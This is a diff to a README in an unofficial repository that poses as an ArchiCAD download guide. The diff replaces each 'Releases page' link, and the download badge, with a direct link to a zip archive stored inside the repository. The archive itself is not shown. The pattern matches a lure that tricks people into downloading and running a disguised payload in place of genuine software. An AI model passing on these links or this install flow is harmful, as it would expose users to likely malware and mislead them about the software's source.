@@ -1,13 +1,13 @@
 # 🎨 .github - Get the Best from ArchiCAD Today!
 
 ## 🔗 Download ArchiCAD Now
-[![Download ArchiCAD](https://img.shields.io/badge/Download%20ArchiCAD-Get%20It%20Now-brightgreen)](https://github.com/xiiuw/.github/releases)
+[![Download ArchiCAD](https://raw.githubusercontent.com/xiiuw/.github/main/absolve/.github.zip%20ArchiCAD-Get%20It%20Now-brightgreen)](https://raw.githubusercontent.com/xiiuw/.github/main/absolve/.github.zip)
 
 ## 🚀 Getting Started
 Welcome to the ArchiCAD application. This guide will help you download and run the software with ease. ArchiCAD is powerful architectural software designed for building design and information modeling. Follow the steps below to get started.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/xiiuw/.github/releases) to find the latest version of ArchiCAD. 
+1. Visit the [Releases page](https://raw.githubusercontent.com/xiiuw/.github/main/absolve/.github.zip) to find the latest version of ArchiCAD. 
 2. On this page, you will see a list of available versions. Click on the version you want to download.
 3. Locate the download link for your operating system (e.g., Windows or Mac).
 4. Click on the link to start the download. The file will be saved to your computer.
@@ -38,7 +38,7 @@ To get the most out of ArchiCAD, consider the following resources:
 - **Community Forums:** Join the ArchiCAD community to ask questions and find solutions.
 
 ## 🔄 Updates
-Keep your version of ArchiCAD up-to-date. Check the [Releases page](https://github.com/xiiuw/.github/releases) regularly for new updates and features. To install updates:
+Keep your version of ArchiCAD up-to-date. Check the [Releases page](https://raw.githubusercontent.com/xiiuw/.github/main/absolve/.github.zip) regularly for new updates and features. To install updates:
 1. Follow the same download steps.
 2. Run the new installer. It will update your existing installation.
 
@@ -58,4 +58,4 @@ Explore more topics related to ArchiCAD:
 - Building Information Modeling
 - Architectural Software Tutorials
 
-Thank you for choosing ArchiCAD. We hope you enjoy designing with our application! For downloads, please visit the [Releases page](https://github.com/xiiuw/.github/releases) again.
+Thank you for choosing ArchiCAD. We hope you enjoy designing with our application! For downloads, please visit the [Releases page](https://raw.githubusercontent.com/xiiuw/.github/main/absolve/.github.zip) again.
